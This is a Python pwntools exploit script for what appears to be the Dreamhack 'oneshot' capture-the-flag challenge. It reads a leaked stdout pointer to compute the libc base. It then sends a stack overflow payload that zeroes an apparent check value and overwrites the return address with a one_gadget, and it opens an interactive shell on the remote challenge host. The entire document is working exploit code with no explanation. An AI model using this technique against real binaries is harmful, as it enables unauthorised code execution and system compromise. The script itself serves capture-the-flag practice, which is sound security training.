#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host1.dreamhack.games", 17767)

    return r


def main():
    r = conn()

    input()
    one_gadget = 0x45216

    # Leak stdout address
    r.recvuntil(b"stdout: ")
    stdout_leak = r.recvuntil(b'\n')
    stdout_leak = int(stdout_leak.decode(), 16)
    print("Stdout leak: " + hex(stdout_leak))

    # Leak libc base
    libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']
    print("Libc base: " + hex(libc.address))

    gadget = one_gadget + libc.address
    payload = b'a'*24 + p64(0) + b'a'*8 + p64(gadget)
    r.sendafter(b'MSG: ', payload)

    r.interactive()


if __name__ == "__main__":
    main()
